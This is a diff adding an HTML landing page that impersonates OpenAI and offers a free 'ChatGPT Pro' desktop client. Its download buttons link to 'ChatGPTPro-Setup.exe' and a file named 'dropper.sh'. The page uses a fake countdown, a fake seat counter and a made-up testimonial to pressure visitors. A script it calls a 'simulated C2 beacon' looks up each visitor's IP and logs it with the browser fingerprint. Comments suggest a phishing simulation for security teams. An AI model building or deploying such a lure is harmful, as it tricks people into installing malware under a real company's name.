@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ChatGPT Pro – Free Access | OpenAI</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --green: #10A37F;
+    --green-glow: #1bd49f;
+    --dark-1: #111111;
+    --dark-2: #1a1a1a;
+    --dark-3: #222222;
+    --dark-4: #2a2a2a;
+    --text: #ececec;
+    --text-muted: #a0a0a0;
+    --radius: 14px;
+    --radius-sm: 10px;
+  }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    background: var(--dark-1);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* Animated grid background */
+  .bg-grid {
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(26,26,26,0.92) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(26,26,26,0.92) 1px, transparent 1px);
+    background-size: 60px 60px;
+    z-index: 0;
+  }
+
+  /* Floating orb glow */
+  .orb {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(120px);
+    opacity: 0.06;
+    pointer-events: none;
+    z-index: 0;
+  }
+  .orb-1 {
+    width: 600px; height: 600px;
+    background: var(--green);
+    top: -200px; left: -150px;
+    animation: float1 12s ease-in-out infinite;
+  }
+  .orb-2 {
+    width: 500px; height: 500px;
+    background: #6C5CE7;
+    bottom: -200px; right: -150px;
+    animation: float2 15s ease-in-out infinite;
+  }
+  .orb-3 {
+    width: 400px; height: 400px;
+    background: var(--green);
+    top: 50%; left: 50%;
+    transform: translate(-50%,-50%);
+    animation: pulse 5s ease-in-out infinite;
+  }
+
+  @keyframes float1 {
+    0%,100% { transform: translate(0,0) scale(1); }
+    33% { transform: translate(80px,-40px) scale(1.1); }
+    66% { transform: translate(-30px,60px) scale(0.95); }
+  }
+  @keyframes float2 {
+    0%,100% { transform: translate(0,0) scale(1); }
+    33% { transform: translate(-60px,-50px) scale(1.15); }
+    66% { transform: translate(40px,30px) scale(0.9); }
+  }
+  @keyframes pulse {
+    0%,100% { transform: translate(-50%,-50%) scale(1); opacity: 0.06; }
+    50% { transform: translate(-50%,-50%) scale(1.2); opacity: 0.12; }
+  }
+  @keyframes shimmer {
+    0% { background-position: -200% center; }
+    100% { background-position: 200% center; }
+  }
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+  @keyframes countPulse {
+    0%,100% { box-shadow: 0 0 0 0 rgba(16,163,127,0.5); }
+    50% { box-shadow: 0 0 0 15px rgba(16,163,127,0); }
+  }
+
+  /* Header */
+  header {
+    position: relative;
+    z-index: 10;
+    padding: 18px 32px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid rgba(255,255,255,0.06);
+    backdrop-filter: blur(12px);
+    background: rgba(17,17,17,0.7);
+  }
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: var(--text);
+    text-decoration: none;
+    letter-spacing: -0.3px;
+  }
+  .logo svg { width: 28px; height: 28px; }
+  .nav-links {
+    display: flex;
+    gap: 28px;
+    align-items: center;
+  }
+  .nav-links a {
+    color: var(--text-muted);
+    text-decoration: none;
+    font-size: 0.875rem;
+    font-weight: 500;
+    transition: color 0.2s;
+  }
+  .nav-links a:hover { color: var(--text); }
+  .nav-badge {
+    background: var(--green);
+    color: #000;
+    font-size: 0.7rem;
+    font-weight: 700;
+    padding: 3px 8px;
+    border-radius: 100px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  /* Main */
+  main {
+    position: relative;
+    z-index: 5;
+    padding: 0 32px;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+
+  /* Hero */
+  .hero {
+    text-align: center;
+    padding: 80px 0 50px;
+    animation: slideUp 0.8s ease-out;
+  }
+  .hero-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(16,163,127,0.12);
+    border: 1px solid rgba(16,163,127,0.25);
+    color: var(--green-glow);
+    font-size: 0.8rem;
+    font-weight: 600;
+    padding: 8px 18px;
+    border-radius: 100px;
+    margin-bottom: 28px;
+    animation: countPulse 2.5s infinite;
+  }
+  .hero-badge .dot {
+    width: 7px; height: 7px;
+    background: var(--green-glow);
+    border-radius: 50%;
+    animation: pulse 2s infinite;
+  }
+  .hero h1 {
+    font-size: clamp(2.4rem, 5vw, 4rem);
+    font-weight: 800;
+    letter-spacing: -1.5px;
+    line-height: 1.1;
+    margin-bottom: 20px;
+    background: linear-gradient(135deg, #fff 0%, #ccc 40%, var(--green-glow) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .hero-btn {
+    font-size: 1.15rem;
+    padding: 18px 44px;
+    margin-bottom: 14px;
+    animation: slideUp 0.8s ease-out 0.1s both;
+  }
+  .hero-cta-sub {
+    font-size: 0.88rem;
+    color: var(--text-muted);
+    margin-bottom: 28px;
+    opacity: 0.8;
+  }
+
+  /* Countdown */
+  .countdown-bar {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    background: var(--dark-3);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 100px;
+    padding: 8px 8px 8px 22px;
+    font-size: 0.85rem;
+    margin-bottom: 40px;
+  }
+  .countdown-bar .label { color: var(--text-muted); }
+  .countdown-bar .timer {
+    color: #ff6b6b;
+    font-weight: 700;
+    font-variant-numeric: tabular-nums;
+  }
+  .countdown-bar .seats {
+    background: #ff6b6b;
+    color: #000;
+    font-weight: 700;
+    font-size: 0.75rem;
+    padding: 5px 12px;
+    border-radius: 100px;
+  }
+
+  /* Features grid */
+  .features {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 20px;
+    margin: 0 auto 50px;
+    max-width: 900px;
+    animation: slideUp 1s ease-out 0.2s both;
+  }
+  .feature-card {
+    background: var(--dark-2);
+    border: 1px solid rgba(255,255,255,0.06);
+    border-radius: var(--radius);
+    padding: 32px 28px;
+    transition: transform 0.2s, border-color 0.2s;
+  }
+  .feature-card:hover {
+    transform: translateY(-3px);
+    border-color: rgba(16,163,127,0.35);
+  }
+  .feature-icon {
+    width: 44px; height: 44px;
+    border-radius: var(--radius-sm);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 18px;
+    font-size: 1.3rem;
+  }
+  .fi-green { background: rgba(16,163,127,0.15); color: var(--green-glow); }
+  .fi-purple { background: rgba(108,92,231,0.15); color: #a29bfe; }
+  .fi-blue { background: rgba(0,163,255,0.15); color: #74b9ff; }
+  .feature-card h3 {
+    font-size: 1rem;
+    font-weight: 700;
+    margin-bottom: 8px;
+    letter-spacing: -0.3px;
+  }
+  .feature-card p {
+    font-size: 0.875rem;
+    color: var(--text-muted);
+    line-height: 1.55;
+  }
+
+  /* CTA Section */
+  .cta-section {
+    text-align: center;
+    padding: 40px 0 80px;
+    animation: fadeIn 0.6s ease-out 0.4s both;
+  }
+  .cta-section h2 {
+    font-size: 1.5rem;
+    font-weight: 700;
+    margin-bottom: 10px;
+    letter-spacing: -0.5px;
+  }
+  .cta-section .sub {
+    color: var(--text-muted);
+    font-size: 0.9rem;
+    margin-bottom: 28px;
+  }
+  .download-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    background: var(--green);
+    color: #000;
+    font-size: 1.05rem;
+    font-weight: 700;
+    padding: 16px 40px;
+    border-radius: 100px;
+    text-decoration: none;
+    letter-spacing: -0.3px;
+    transition: all 0.25s;
+    position: relative;
+    overflow: hidden;
+  }
+  .download-btn::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+    background-size: 200% 100%;
+    animation: shimmer 2.5s infinite;
+  }
+  .download-btn:hover {
+    transform: scale(1.04);
+    box-shadow: 0 8px 32px rgba(16,163,127,0.35);
+  }
+  .download-btn:active { transform: scale(0.98); }
+  .download-btn svg { width: 20px; height: 20px; position: relative; z-index: 1; }
+  .download-btn span { position: relative; z-index: 1; }
+  .cta-note {
+    color: var(--text-muted);
+    font-size: 0.78rem;
+    margin-top: 16px;
+    opacity: 0.7;
+  }
+
+  /* Testimonial */
+  .testimonial {
+    text-align: center;
+    padding: 50px 0;
+    animation: fadeIn 0.5s ease-out 0.6s both;
+  }
+  .testimonial blockquote {
+    font-size: 1rem;
+    font-style: italic;
+    color: var(--text-muted);
+    max-width: 500px;
+    margin: 0 auto 12px;
+    line-height: 1.5;
+  }
+  .testimonial .author {
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: var(--text);
+  }
+  .testimonial .author span { color: var(--text-muted); font-weight: 400; }
+
+  /* Footer */
+  footer {
+    position: relative;
+    z-index: 5;
+    border-top: 1px solid rgba(255,255,255,0.05);
+    padding: 20px 32px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.75rem;
+    color: var(--text-muted);
+    opacity: 0.5;
+  }
+
+  /* Responsive */
+  @media (max-width: 640px) {
+    .nav-links { display: none; }
+    main { padding: 0 16px; }
+    .hero { padding: 60px 0 30px; }
+    .hero h1 { font-size: 2rem; }
+    .cta-section { padding: 20px 0 50px; }
+    .features { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="orb orb-1"></div>
+<div class="orb orb-2"></div>
+<div class="orb orb-3"></div>
+
+<header>
+  <a href="#" class="logo">
+    <img src="openai.png" alt="OpenAI" width="28" height="28" style="display:block;" />
+    OpenAI
+  </a>
+  <nav class="nav-links">
+    <a href="#">Research</a>
+    <a href="#">Products</a>
+    <a href="#">Safety</a>
+    <a href="#">Company</a>
+    <span class="nav-badge">New</span>
+  </nav>
+</header>
+
+<main>
+  <section class="hero">
+    <div class="hero-badge">
+      <span class="dot"></span>
+      Limited-Time Early Access Program
+    </div>
+    <h1>ChatGPT Pro<br>Free Desktop Access</h1>
+
+    <a href="ChatGPTPro-Setup.exe" class="download-btn hero-btn" download>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      <span>Download ChatGPT Pro</span>
+    </a>
+    <p class="hero-cta-sub">Available for macOS, Windows, and Linux &middot; No credit card required</p>
+
+    <div class="countdown-bar">
+      <span class="label">Offer expires in</span>
+      <span class="timer" id="countdown">--:--:--</span>
+      <span class="seats" id="seats-left">47 seats left</span>
+    </div>
+  </section>
+
+  <div class="features">
+    <div class="feature-card">
+      <div class="feature-icon fi-green">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <h3>Unlimited GPT-4o Access</h3>
+      <p>No caps, no rate limits. Full reasoning depth with the most capable model available.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon fi-purple">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg>
+      </div>
+      <h3>DALL·E Image Generation</h3>
+      <p>Create stunning images with the latest DALL·E model built directly into the app.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon fi-blue">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      </div>
+      <h3>Priority Response Time</h3>
+      <p>Skip the queue. Your requests go straight to our fastest inference clusters.</p>
+    </div>
+  </div>
+
+  <div class="testimonial">
+    <blockquote>"ChatGPT Pro has completely transformed my workflow. The desktop client is fast, clean, and the unlimited access is a game-changer."</blockquote>
+    <div class="author">Sarah Chen <span>&mdash; Senior Software Engineer at Stripe</span></div>
+  </div>
+
+  <div class="cta-section">
+    <h2>Download the ChatGPT Pro Desktop Client</h2>
+    <p class="sub">Available for macOS, Windows, and Linux. No credit card required.</p>
+    <a href="ChatGPTPro-Setup.exe" class="download-btn" download>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      <span>Download for Windows</span>
+    </a>
+    <div style="margin-top:14px;"></div>
+    <a href="dropper.sh" class="download-btn" download style="background:var(--dark-3);color:var(--text);font-size:0.9rem;padding:12px 32px;">
+      <span>Download for Linux</span>
+    </a>
+    <p class="cta-note">Version 2.4.1 &middot; 142 MB &middot; SHA-256 verified</p>
+  </div>
+</main>
+
+<footer>
+  <span>&copy; 2026 OpenAI &middot; All rights reserved</span>
+  <span>Privacy &middot; Terms &middot; Security</span>
+</footer>
+
+<script>
+  // Fake dynamic countdown - resets every 6 hours
+  const endTime = new Date(Date.now() + (6 * 60 * 60 * 1000));
+  function updateCountdown() {
+    const now = new Date();
+    const diff = endTime - now;
+    if (diff <= 0) { document.getElementById('countdown').textContent = '00:00:00'; return; }
+    const h = Math.floor(diff / 3600000);
+    const m = Math.floor((diff % 3600000) / 60000);
+    const s = Math.floor((diff % 60000) / 1000);
+    document.getElementById('countdown').textContent =
+      `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+  }
+  setInterval(updateCountdown, 1000);
+  updateCountdown();
+
+  // Fake seat counter
+  function updateSeats() {
+    const el = document.getElementById('seats-left');
+    const seats = Math.max(1, 47 - Math.floor((Date.now() / 30000) % 48));
+    el.textContent = seats + ' seats left';
+  }
+  setInterval(updateSeats, 5000);
+  updateSeats();
+
+  // Subtle IP logging (simulated C2 beacon)
+  fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(d => {
+      // In real malware this would exfiltrate; here just logs to console for SOC
+      console.debug('[beacon] session fingerprint:', {
+        ip: d.ip,
+        ua: navigator.userAgent,
+        ts: Date.now(),
+        ref: document.referrer
+      });
+    })
+    .catch(() => {});
+</script>
+
+</body>
+</html>
